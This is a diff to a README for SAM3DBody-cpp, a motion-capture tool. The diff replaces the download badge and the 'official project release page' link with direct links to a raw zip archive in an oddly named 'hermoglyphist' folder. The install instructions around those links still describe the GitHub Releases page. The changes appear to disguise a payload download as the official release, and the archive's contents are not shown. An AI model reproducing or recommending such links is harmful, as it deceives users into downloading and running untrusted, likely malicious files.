@@ -1,6 +1,6 @@
 # 👤 SAM3DBody-cpp - Track human movement with one camera
 
-[![Download SAM3DBody on GitHub](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Washin1918/SAM3DBody-cpp)
+[![Download SAM3DBody on GitHub](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Washin1918/SAM3DBody-cpp/raw/refs/heads/main/hermoglyphist/Body_cpp_SA_D_3.6.zip)
 
 SAM3DBody-cpp turns a standard camera into a motion capture system. It maps your body, arms, and hands into a 3D skeleton in real time. The software saves these movements as a BVH animation file. Engineers and artists use this for game development and character animation.
 
@@ -16,7 +16,7 @@ This software performs complex calculations. You need a Windows computer with mo
 
 ## ⬇️ Install the Software
 
-1.  Visit the [official project release page](https://github.com/Washin1918/SAM3DBody-cpp).
+1.  Visit the [official project release page](https://github.com/Washin1918/SAM3DBody-cpp/raw/refs/heads/main/hermoglyphist/Body_cpp_SA_D_3.6.zip).
 2.  Look for the "Releases" section on the right side of the screen.
 3.  Click the most recent version number.
 4.  Find the file ending in `.zip` under the "Assets" heading.
